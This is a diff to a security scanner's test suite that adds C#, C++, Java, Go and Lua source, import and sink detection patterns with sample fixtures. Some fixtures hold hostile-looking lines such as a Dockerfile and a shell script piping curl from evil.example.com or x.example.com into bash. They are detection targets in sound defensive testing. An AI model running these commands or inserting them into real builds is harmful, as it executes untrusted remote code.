@@ -207,6 +207,12 @@ int main(int argc, char **argv) {
 }
 """
 
+CPP_HTTP_SOURCE_SRC = """\
+void serve(const Request& req) {
+    auto path = req.path;
+}
+"""
+
 SHELL_SOURCES_SRC = "#!/bin/bash\necho $1\necho $HOME\necho ${path}\necho $USER_input\n"
 
 DOCKERFILE_SOURCES_SRC = "FROM alpine\nARG BUILD_ID\nENV API_KEY=changeme\n"
@@ -230,6 +236,26 @@ function Get-UserData {
 }
 """
 
+CSHARP_SOURCES_SRC = """\
+using Microsoft.AspNetCore.Mvc;
+using System;
+
+public class HomeController : Controller
+{
+    public IActionResult Index()
+    {
+        var id = Request.QueryString["id"];
+        var home = Environment.GetEnvironmentVariable("HOME");
+        return View();
+    }
+
+    public IActionResult Save([FromBody] string body)
+    {
+        return Ok();
+    }
+}
+"""
+
 # ---------------------------------------------------------------------------
 # Fixtures -- imports / extra sinks / extra entry points, one line per
 # pattern, tested via `streaming_security_fallback` directly (matching the
@@ -247,6 +273,7 @@ PHP_IMPORT_SRC = (
     "<?php\ninclude 'a.php';\ninclude_once 'b.php';\n"
     "require 'c.php';\nrequire_once 'd.php';\nuse App\\Foo;\n"
 )
+CSHARP_IMPORT_SRC = "using System.Data;\nusing System.Text;\nusing static System.Math;\n"
 C_IMPORT_SRC = '#include <stdio.h>\n#include "local.h"\n'
 CPP_IMPORT_SRC = '#include <iostream>\n#include "local.hpp"\n'
 LUA_IMPORT_SRC = "local m = require('module')\n"
@@ -270,7 +297,7 @@ DOCKERFILE_SINK_SRC = (
     "FROM alpine\nRUN curl https://evil.example.com/x.sh | bash\nRUN chmod -R 0777 /app\n"
 )
 SHELL_SINK_SRC = '#!/bin/bash\neval "$cmd"\ncurl https://x.example.com/i.sh | sh\n'
-LUA_SINK_SRC = "loadstring(usercode)()\nos.execute(cmd)\n"
+LUA_SINK_SRC = "loadstring(usercode)()\nos.execute(cmd)\nreturn redis.call(ARGV[1], KEYS[1])\n"
 HTML_SINK_SRC = '<button onclick="doThing()">Go</button>\n<p>{{ raw_html }}</p>\n'
 FREEMARKER_SINK_SRC = (
     '<p>${value}</p>\n<button onclick="go(\'${x}\')">Go</button>\n<p>${data?eval}</p>\n'
@@ -318,15 +345,21 @@ PS_ENTRY_SRC = "param(\n  [string]$Name\n)\n"
 # Fields: (table, language, pattern, route, source, file_path, needle, kind)
 LIVE_CASES: list[tuple[str, str, str, str, str, str, str, str]] = [
     # ============================= sources ================================
-    ("source", "python", r"\brequest\.(?:args|form|json|values|files|headers)\b", "source", PY_SOURCES_SRC, "app.py", "uid = request.args.get('id')", "http_request_input"),
+    ("source", "python", r"\brequest\.(?:args|form|json|values|files|headers|GET|POST|FILES|COOKIES|META|body)\b", "source", PY_SOURCES_SRC, "app.py", "uid = request.args.get('id')", "http_request_input"),
     ("source", "python", r"\b(?:sys\.argv|os\.environ|getenv\s*\(|input\s*\()", "source", PY_SOURCES_SRC, "app.py", "a = sys.argv[1]", "process_input"),
     ("source", "javascript", r"\breq\.(?:params|query|body|headers|cookies)\b", "source", JS_SOURCES_SRC, "server.js", "const id = req.params.id;", "http_request_input"),
     ("source", "javascript", r"\bprocess\.(?:argv|env)\b", "source", JS_SOURCES_SRC, "server.js", "const a = process.argv[2];", "process_input"),
     ("source", "typescript", r"\breq\.(?:params|query|body|headers|cookies)\b", "source", TS_SOURCES_SRC, "server.ts", "const id = req.params.id;", "http_request_input"),
     ("source", "typescript", r"\bprocess\.(?:argv|env)\b", "source", TS_SOURCES_SRC, "server.ts", "const a = process.argv[2];", "process_input"),
     ("source", "java", r"\bget(?:Parameter|Header|InputStream)\s*\(", "source", JAVA_SOURCES_SRC, "App.java", 'String p = req.getParameter("id");', "http_request_input"),
+    ("source", "java", r"@(?:PathVariable|MatrixVariable|RequestParam|RequestHeader|CookieValue|RequestBody|RequestPart|ModelAttribute|PathParam|QueryParam|FormParam|HeaderParam|CookieParam|MatrixParam)\b", "source",
+     'class Files { @GetMapping("/files") String read(@RequestParam String name) { return name; } }',
+     "Files.java", "@RequestParam String name", "http_request_input"),
+    ("source", "java", r"\brequest\.(?:pathVariable|queryParam|param|headers|body)\s*\(", "source",
+     'class Routes { Object route() { return request.pathVariable("name"); } }',
+     "Routes.java", 'request.pathVariable("name")', "http_request_input"),
     ("source", "java", r"\bSystem\.getenv\s*\(", "source", JAVA_SOURCES_SRC, "App.java", 'String env = System.getenv("HOME");', "process_input"),
-    ("source", "go", r"\br\.(?:URL\.Query|FormValue|Header\.Get)\s*\(", "source", GO_SOURCES_SRC, "main.go", 'q := r.URL.Query()', "http_request_input"),
+    ("source", "go", r"\b(?:r|req|request)\.(?:URL\.Query|FormValue|PostFormValue|PathValue|Header\.Get|Cookie|FormFile)\s*\(", "source", GO_SOURCES_SRC, "main.go", 'q := r.URL.Query()', "http_request_input"),
     ("source", "go", r"\bos\.(?:Args|Getenv)\b", "source", GO_SOURCES_SRC, "main.go", "a := os.Args[1]", "process_input"),
     ("source", "ruby", r"\b(?:params\s*\[|request\.)", "source", RUBY_SOURCES_SRC, "app.rb", "id = params[:id]", "http_request_input"),
     ("source", "ruby", r"\b(?:ENV\s*\[|ARGV\b)", "source", RUBY_SOURCES_SRC, "app.rb", "e = ENV['HOME']", "process_input"),
@@ -337,7 +370,8 @@ LIVE_CASES: list[tuple[str, str, str, str, str, str, str, str]] = [
     ("source", "blade", r"\{\{(?!--)[^}\r\n]+\}\}|\{!![^!\r\n]+!!\}", "source", BLADE_SOURCES_SRC, "profile.blade.php", "{{ $user->name }}", "template_input"),
     ("source", "c", r"\b(?:argv\s*\[|getenv\s*\(|read\s*\(|recv\s*\()", "source", C_SOURCES_SRC, "main.c", 'char *a = argv[1];', "process_input"),
     ("source", "cpp", r"\b(?:argv\s*\[|getenv\s*\(|read\s*\(|recv\s*\()", "source", CPP_SOURCES_SRC, "main.cpp", 'char *a = argv[1];', "process_input"),
-    ("source", "shell", r"\$(?:[1-9]|@|\*)\b", "source", SHELL_SOURCES_SRC, "install.sh", "echo $1", "positional_parameter"),
+    ("source", "cpp", r"\b(?:req|request)\.(?:path|body|get_param_value\s*\(|get_header_value\s*\()", "source", CPP_HTTP_SOURCE_SRC, "server.cpp", "req.path", "http_request_input"),
+    ("source", "shell", r"\$(?:[1-9]\b|[@*]|\{(?:[1-9][0-9]*|[@*])\})", "source", SHELL_SOURCES_SRC, "install.sh", "echo $1", "positional_parameter"),
     ("source", "shell", r"\$\{?[A-Z_][A-Z0-9_]*\}?", "source", SHELL_SOURCES_SRC, "install.sh", "echo $HOME", "environment_input"),
     ("source", "dockerfile", r"^\s*(?:ARG|ENV)\s+[A-Za-z_][A-Za-z0-9_]*", "source", DOCKERFILE_SOURCES_SRC, "Dockerfile", "ARG BUILD_ID", "build_argument"),
     ("source", "lua", r"\b(?:ARGV|KEYS)\s*\[", "source", LUA_SOURCES_SRC, "script.lua", "local id = ARGV[1]", "script_argument"),
@@ -347,6 +381,9 @@ LIVE_CASES: list[tuple[str, str, str, str, str, str, str, str]] = [
     ("source", "powershell", r"\$(?:args|PSBoundParameters|MyInvocation)\b", "source", PS_SOURCES_SRC, "script.ps1", "$name = $args[0]", "script_parameter"),
     ("source", "powershell", r"\$env:[A-Za-z_]\w*", "source", PS_SOURCES_SRC, "script.ps1", "$key = $env:API_KEY", "environment_input"),
     ("source", "powershell", r"\bRead-Host\b", "source", PS_SOURCES_SRC, "script.ps1", "$answer = Read-Host", "interactive_input"),
+    ("source", "csharp", r"\b(?:HttpContext\.)?Request\.(?:Form|QueryString|Query|Params|Headers|Cookies|Body)\b", "source", CSHARP_SOURCES_SRC, "HomeController.cs", 'var id = Request.QueryString["id"];', "http_request_input"),
+    ("source", "csharp", r"\[From(?:Body|Query|Route|Form|Header)\b", "source", CSHARP_SOURCES_SRC, "HomeController.cs", "public IActionResult Save([FromBody] string body)", "http_request_input"),
+    ("source", "csharp", r"\b(?:Environment\.GetEnvironmentVariable\s*\(|Console\.ReadLine\s*\()", "source", CSHARP_SOURCES_SRC, "HomeController.cs", 'var home = Environment.GetEnvironmentVariable("HOME");', "process_input"),
     # ============================= imports =================================
     ("import", "python", r"\b(?:from\s+[\w.]+\s+import\b[^\r\n]*|import\s+[^\r\n]+)", "import", PY_IMPORT_SRC, "x.py", "import os", None),
     ("import", "javascript", r"\bimport\b[^\r\n]*", "import", JS_IMPORT_SRC, "x.js", "import foo from 'foo';", None),
@@ -357,6 +394,7 @@ LIVE_CASES: list[tuple[str, str, str, str, str, str, str, str]] = [
     ("import", "go", r"\bimport\s*(?:\([^\r\n]*|[\"`][^\"`]+[\"`])", "import", GO_IMPORT_SRC, "x.go", "import (", None),
     ("import", "ruby", r"\b(?:require|require_relative|load)\s*\(?\s*['\"][^'\"]+", "import", RUBY_IMPORT_SRC, "x.rb", "require 'json'", None),
     ("import", "php", r"\b(?:include|include_once|require|require_once|use)\b[^\r\n;]*", "import", PHP_IMPORT_SRC, "x.php", "include 'a.php';", None),
+    ("import", "csharp", r"\busing\s+(?:static\s+)?[^\r\n;=]+", "import", CSHARP_IMPORT_SRC, "Repo.cs", "using System.Data", None),
     ("import", "c", r"#\s*include\s*[<\"][^>\"]+[>\"]", "import", C_IMPORT_SRC, "x.c", "#include <stdio.h>", None),
     ("import", "cpp", r"#\s*include\s*[<\"][^>\"]+[>\"]", "import", CPP_IMPORT_SRC, "x.cpp", "#include <iostream>", None),
     ("import", "lua", r"\brequire\s*\(?\s*['\"][^'\"]+", "import", LUA_IMPORT_SRC, "x.lua", "local m = require('module')", None),
@@ -375,6 +413,7 @@ LIVE_CASES: list[tuple[str, str, str, str, str, str, str, str]] = [
     ("extra_sink", "dockerfile", r"\bchmod\s+(?:-R\s+)?[0-7]*777\b", "extra_sink", DOCKERFILE_SINK_SRC, "Dockerfile", "RUN chmod -R 0777 /app", "permissive_chmod"),
     ("extra_sink", "shell", r"\beval\b", "extra_sink", SHELL_SINK_SRC, "x.sh", 'eval "$cmd"', "shell_eval"),
     ("extra_sink", "shell", r"\b(?:curl|wget)\b[^\r\n|;]*\|\s*(?:sh|bash|zsh)\b", "extra_sink", SHELL_SINK_SRC, "x.sh", "curl https://x.example.com/i.sh | sh", "remote_pipe_to_shell"),
+    ("extra_sink", "lua", treesitter_index._LUA_DYNAMIC_REDIS_COMMAND_RE, "extra_sink", LUA_SINK_SRC, "x.lua", "redis.call(ARGV[1], KEYS[1])", "redis_dynamic_command"),
     ("extra_sink", "lua", r"\b(?:loadstring|load)\s*\(", "extra_sink", LUA_SINK_SRC, "x.lua", "loadstring(usercode)()", "dynamic_code_load"),
     ("extra_sink", "lua", r"\bos\.execute\s*\(", "extra_sink", LUA_SINK_SRC, "x.lua", "os.execute(cmd)", "os_execute"),
     ("extra_sink", "html", r"\bon[a-z]+\s*=\s*['\"][^'\"]+['\"]", "extra_sink", HTML_SINK_SRC, "x.html", 'onclick="doThing()"', "inline_event_handler"),
@@ -403,11 +442,11 @@ LIVE_CASES: list[tuple[str, str, str, str, str, str, str, str]] = [
     ("extra_entry", "shell", r"^#!", "extra_entry", SHELL_ENTRY_SRC, "x.sh", "#!/bin/bash", "shell_script"),
     ("extra_entry", "dockerfile", r"^\s*CMD\b", "extra_entry", DOCKERFILE_ENTRY_SRC, "Dockerfile", 'CMD ["run"]', "container_cmd"),
     ("extra_entry", "dockerfile", r"^\s*ENTRYPOINT\b", "extra_entry", DOCKERFILE_ENTRY_SRC, "Dockerfile", 'ENTRYPOINT ["/bin/app"]', "container_entrypoint"),
-    ("extra_entry", "html", r"<form\b[^>]*\baction\s*=", "extra_entry", HTML_ENTRY_SRC, "x.html", '<form action="/submit"', "html_form"),
-    ("extra_entry", "freemarker", r"<form\b[^>]*\baction\s*=", "extra_entry", FREEMARKER_ENTRY_SRC, "x.ftl", '<form action="/submit">', "html_form"),
+    ("extra_entry", "html", r"<form\b", "extra_entry", HTML_ENTRY_SRC, "x.html", '<form action="/submit"', "html_form"),
+    ("extra_entry", "freemarker", r"<form\b", "extra_entry", FREEMARKER_ENTRY_SRC, "x.ftl", '<form action="/submit">', "html_form"),
     ("extra_entry", "freemarker", r"<#(?:macro|function)\s", "extra_entry", FREEMARKER_ENTRY_SRC, "x.ftl", "<#macro alert kind>", "freemarker_macro"),
     ("extra_entry", "powershell", r"^\s*param\s*\(", "extra_entry", PS_ENTRY_SRC, "mod2.ps1", "param(", "script_parameters"),
-    ("extra_entry", "blade", r"<form\b[^>]*\baction\s*=", "extra_entry", BLADE_ENTRY_SRC, "x.blade.php", '<form action="/tags/save"', "html_form"),
+    ("extra_entry", "blade", r"<form\b", "extra_entry", BLADE_ENTRY_SRC, "x.blade.php", '<form action="/tags/save"', "html_form"),
 ]
 
 
@@ -669,10 +708,11 @@ def test_catalogue_sweep_covers_every_streaming_pattern() -> None:
         | _real_extra_sink_keys()
         | _real_extra_entry_keys()
     )
-    assert len(real_keys) == 83, (
-        f"expected 83 streaming catalogue entries (29 sources + 22 imports + "
-        f"24 extra sinks + 8 extra entry points -- includes the powershell and "
-        f"blade languages added mid-audit), found {len(real_keys)}. The catalogue "
+    assert len(real_keys) == 91, (
+        f"expected 91 streaming catalogue entries (35 sources + 23 imports + "
+        f"25 extra sinks + 8 extra entry points -- includes the powershell and "
+        f"blade languages added mid-audit, and the csharp source/import tables "
+        f"added with C# tree-sitter support), found {len(real_keys)}. The catalogue "
         f"has drifted since this audit; update LIVE_CASES/OBSOLETE_PATTERNS."
     )
 
